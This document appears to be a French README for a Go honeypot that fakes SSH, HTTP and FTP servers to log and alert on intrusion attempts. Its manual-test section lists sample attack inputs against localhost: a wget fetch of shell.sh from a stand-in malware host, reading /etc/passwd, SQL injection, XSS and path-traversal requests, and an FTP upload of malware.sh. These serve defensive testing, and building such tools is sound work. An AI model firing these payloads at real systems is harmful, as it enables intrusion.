# 🍯 Honey Multi-Protocol Honeypot

Un honeypot multi-protocoles professionnel développé en Go pour détecter et analyser les tentatives d'intrusion. Ce projet simule des serveurs **SSH, HTTP/HTTPS et FTP** factices pour capturer les activités des attaquants en temps réel.

[![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go)](https://golang.org/)
[![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?style=flat&logo=docker)](https://www.docker.com/)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

## 🎯 Fonctionnalités Principales

### 🔐 **Honeypot SSH**
- Shell interactif réaliste avec plus de 100 commandes simulées
- Détection de brute force et tentatives d'intrusion
- Capture de toutes les commandes exécutées
- Hostname personnalisable (`Tech.fr` par défaut)

### 🌐 **Honeypot HTTP/HTTPS**
- Simulation de WordPress, phpMyAdmin, panels admin
- Détection de vulnérabilités (SQLi, XSS, Command Injection, Path Traversal, etc.)
- Capture d'uploads malveillants
- Détection de scanners automatiques (Nikto, sqlmap, Nmap, etc.)
- Honeytokens dans les pages (fausses credentials, API keys)

### 📁 **Honeypot FTP**
- Serveur FTP factice avec authentification
- Capture des tentatives d'upload/download
- Détection de directory traversal
- Logging de toutes les commandes FTP

### 📊 **Dashboard Web**
- Interface moderne avec mode sombre
- Statistiques en temps réel
- Visualisation des connexions SSH, HTTP et FTP
- Analyse des attaques détectées
- Géolocalisation des attaquants

### 📧 **Système d'Alertes**
- Notifications email automatiques (Gmail/Outlook)
- Alertes pour connexions suspectes
- Alertes pour commandes dangereuses
- Alertes pour attaques HTTP/FTP
- Niveaux de sévérité : LOW, MEDIUM, HIGH, CRITICAL

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    ATTAQUANTS                           │
│                    (Internet)                           │
└──────────────────────┬──────────────────────────────────┘
                       │
        ┌──────────────┼──────────────┬──────────────┐
        │              │              │              │
        ▼              ▼              ▼              ▼
    ┌──────┐      ┌────────┐     ┌──────┐      ┌──────┐
    │ SSH  │      │  HTTP  │     │ HTTPS│      │ FTP  │
    │:2222 │      │  :80   │     │ :443 │      │:2121 │
    └───┬──┘      └────┬───┘     └───┬──┘      └───┬──┘
        │              │              │             │
        └──────────────┴──────────────┴─────────────┘
                       │
                       ▼
            ┌──────────────────────┐
            │   Alert Manager      │
            │  (Email Alerts)      │
            └──────────┬───────────┘
                       │
                       ▼
            ┌──────────────────────┐
            │   SQLite Database    │
            │  - Connections       │
            │  - Commands          │
            │  - HTTP Requests     │
            │  - FTP Logs          │
            │  - Alerts            │
            └──────────┬───────────┘
                       │
                       ▼
            ┌──────────────────────┐
            │   Web Dashboard      │
            │   (Port 8080)        │
            │   Dark Mode UI       │
            └──────────────────────┘
```

## 🚀 Installation Rapide (Docker)

### Prérequis
- Docker et Docker Compose installés
- Git

### Déploiement en 3 commandes

```bash
# 1. Cloner le projet
git clone --branch honeypotV6 https://github.com/anis-slimani/Honeypot.git
cd Honeypot

# 2. Lancer avec Docker
docker-compose build
docker-compose up -d

# 3. Accéder au dashboard
# Ouvrir http://localhost:8080 dans votre navigateur
```

### Ports Exposés

| Service | Port | Description |
|---------|------|-------------|
| SSH Honeypot | 2222 | Serveur SSH factice |
| HTTP Honeypot | 80 | Serveur HTTP (WordPress, phpMyAdmin, etc.) |
| HTTPS Honeypot | 443 | Serveur HTTPS (si TLS activé) |
| FTP Honeypot | 2121 | Serveur FTP factice |
| Dashboard Web | 8080 | Interface de monitoring |

## ⚙️ Configuration

### Fichier `config.yaml`

```yaml
# Configuration SSH
ssh:
  host: "0.0.0.0"
  port: 2222
  max_connections: 10
  
# Configuration HTTP
http:
  host: "0.0.0.0"
  port: 80
  tls:
    enabled: false
    cert_file: "server.crt"
    key_file: "server.key"
    
# Configuration FTP
ftp:
  host: "0.0.0.0"
  port: 2121
  
# Utilisateurs factices
auth:
  fake_users:
    - username: "admin"
      password: "*****"
    - username: "root"
      password: "****"
      
# Shell factice
shell:
  prompt: "user@Tech.fr:~$ "
  welcome_message: "Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)"
  
# Dashboard Web
web:
  enabled: true
  host: "0.0.0.0"
  port: 8080
  
# Alertes Email
alerts:
  enabled: true
  email:
    smtp_host: "smtp.gmail.com"
    smtp_port: 587
    username: "honeypotprojet@gmail.com"
    password: "your-app-password"  # Gmail App Password
    to: ["admin@example.com"]
  thresholds:
    failed_attempts: 5
    time_window: 300
    
# Base de données
database:
  path: "/root/data/honeypot.db"
```

### Configuration Email (Gmail)

1. Activer l'authentification à 2 facteurs sur votre compte Gmail
2. Générer un "App Password" : https://myaccount.google.com/apppasswords
3. Utiliser ce mot de passe dans `config.yaml`

## 🧪 Tests et Simulation

### Script de Test Automatique

Le projet inclut un outil de test complet (`./tester`) qui simule des attaques réelles :

```bash
# Lancer tous les tests (SSH + HTTP + FTP)
./tester

# Tests par service
./tester --ssh-only       # SSH seulement
./tester --http-only      # HTTP seulement
./tester --ftp-only       # FTP seulement

# Options
./tester --no-bruteforce  # Sans brute force (plus rapide)
./tester --http-url http://localhost:80  # URL personnalisée
```

### Tests Manuels

#### SSH
```bash
# Connexion SSH
ssh -p 2222 admin@localhost
# Password: ****

# Commandes à tester
whoami
ls -la
cat /etc/passwd
sudo su
ping google.com
wget http://malware.com/shell.sh
```

#### HTTP
```bash
# SQL Injection
curl "http://localhost:80/login.php?user=admin'--"

# XSS
curl "http://localhost:80/search.php?q=<script>alert(1)</script>"

# Path Traversal
curl "http://localhost:80/file.php?page=../../../etc/passwd"

# WordPress
curl http://localhost:80/wp-login.php
curl -X POST http://localhost:80/wp-login.php -d "log=admin&pwd=admin"
```

#### FTP
```bash
# Connexion FTP avec netcat
nc localhost 2121
USER admin
PASS ***
PWD
LIST
STOR malware.sh
QUIT
```

## 📊 Dashboard Web

Accédez au dashboard sur **http://localhost:8080**

### Fonctionnalités

- **📈 Statistiques** : Nombre de connexions, commandes, attaques détectées
- **🔐 SSH** : Connexions, commandes exécutées, sessions actives
- **🌐 HTTP** : Requêtes, attaques détectées (SQLi, XSS, etc.), scanners
- **📁 FTP** : Connexions, commandes, tentatives d'upload
- **🚨 Alertes** : Notifications de sécurité avec niveaux de sévérité
- **🗺️ Géolocalisation** : Origine géographique des attaquants

### API Endpoints

```
GET /api/statistics          # Statistiques générales
GET /api/ssh/connections     # Connexions SSH
GET /api/ssh/commands        # Commandes SSH
GET /api/http/requests       # Requêtes HTTP
GET /api/http/attacks        # Attaques HTTP détectées
GET /api/ftp/connections     # Connexions FTP
GET /api/ftp/commands        # Commandes FTP
GET /api/alerts              # Alertes de sécurité
```

## 🔍 Détection d'Attaques

### SSH
- ✅ Brute force (tentatives multiples)
- ✅ Commandes dangereuses (`rm -rf`, `wget`, `curl`, etc.)
- ✅ Tentatives d'escalade de privilèges (`sudo`, `su`)
- ✅ Scans de ports et reconnaissance

### HTTP
- ✅ SQL Injection (SQLi)
- ✅ Cross-Site Scripting (XSS)
- ✅ Command Injection
- ✅ Path Traversal / Directory Traversal
- ✅ Remote/Local File Inclusion (RFI/LFI)
- ✅ XML External Entity (XXE)
- ✅ Template Injection
- ✅ Scanners automatiques (Nikto, sqlmap, Nmap, etc.)

### FTP
- ✅ Tentatives d'authentification
- ✅ Brute force
- ✅ Upload de fichiers malveillants (`.php`, `.sh`, `.exe`)
- ✅ Directory traversal
- ✅ Command injection

## 🛡️ Sécurité et Bonnes Pratiques

### Recommandations

1. **Isolation** : Déployez dans une VM ou conteneur isolé
2. **Monitoring** : Surveillez régulièrement les logs et alertes
3. **Sauvegarde** : Sauvegardez la base de données régulièrement
4. **Mise à jour** : Maintenez le système à jour
5. **Firewall** : Configurez un pare-feu pour limiter l'exposition

### Volumes Docker

```yaml
volumes:
  - ./logs:/root/logs              # Logs persistants
  - honeypot-data:/root/data       # Base de données
  - honeypot-uploads:/root/uploads # Fichiers uploadés
```

## 🔧 Maintenance

### Commandes Docker

```bash
# Voir les logs
docker-compose logs -f

# Redémarrer
docker-compose restart

# Arrêter
docker-compose down

# Rebuild après modification
docker-compose down
docker-compose build
docker-compose up -d
```

### Sauvegarde

```bash
# Sauvegarder la base de données
docker cp honey-ssh-honeypot:/root/data/honeypot.db backup-$(date +%Y%m%d).db

# Sauvegarder les logs
cp -r logs backup-logs-$(date +%Y%m%d)
```

## 📚 Structure du Projet

```
Honeypot/
├── main.go                          # Point d'entrée
├── config.yaml                      # Configuration
├── Dockerfile                       # Image Docker
├── docker-compose.yml               # Orchestration
├── entrypoint.sh                    # Script de démarrage
├── go.mod                          # Dépendances Go
├── tester                          # Binaire de test (auto-généré)
├── cmd/
│   └── tester/
│       └── main.go                 # Code source du tester
├── internal/
│   ├── config/                     # Gestion configuration
│   ├── database/                   # SQLite
│   ├── honeypot/
│   │   ├── ssh_server.go          # Serveur SSH
│   │   ├── fake_session.go        # Shell factice
│   │   └── alerts.go              # Système d'alertes
│   ├── services/
│   │   ├── http/                  # Honeypot HTTP
│   │   │   ├── http_server.go
│   │   │   ├── router.go
│   │   │   ├── wordpress.go
│   │   │   ├── phpmyadmin.go
│   │   │   └── vulnerability_detector.go
│   │   └── ftp/                   # Honeypot FTP
│   │       └── ftp_server.go
│   ├── logger/                     # Logging
│   ├── models/                     # Modèles de données
│   ├── utils/
│   │   ├── email.go               # Envoi d'emails
│   │   └── geolocation.go         # Géolocalisation
│   └── web/
│       └── web_server.go          # Dashboard
├── templates/                      # Templates HTML
├── static/                         # CSS, JS, images
├── scripts/                        # Scripts utilitaires
└── docs/                          # Documentation
```

## 🐛 Dépannage

### Le tester ne fonctionne pas

```bash
# Recompiler le tester
docker-compose down
docker-compose build
docker-compose up -d
sleep 2
./tester
```

### Problème de ports

```bash
# Vérifier les ports utilisés
netstat -tulpn | grep -E '2222|80|2121|8080'

# Changer les ports dans docker-compose.yml si nécessaire
```

### Base de données corrompue

```bash
# Supprimer et recréer
docker-compose down
docker volume rm honeypot_honeypot-data
docker-compose up -d
```

## 📄 Licence

Ce projet est sous licence MIT. Voir le fichier `LICENSE` pour plus de détails.

## ⚠️ Avertissement Légal

Ce honeypot est destiné à des **fins éducatives et de recherche en sécurité uniquement**. 

- ✅ Utilisez-le dans des environnements contrôlés
- ✅ Obtenez les autorisations nécessaires
- ❌ N'utilisez pas pour des activités illégales
- ❌ Les auteurs ne sont pas responsables de l'utilisation abusive

---


*Honeypot V7 - Multi-Protocol Security Research Platform*
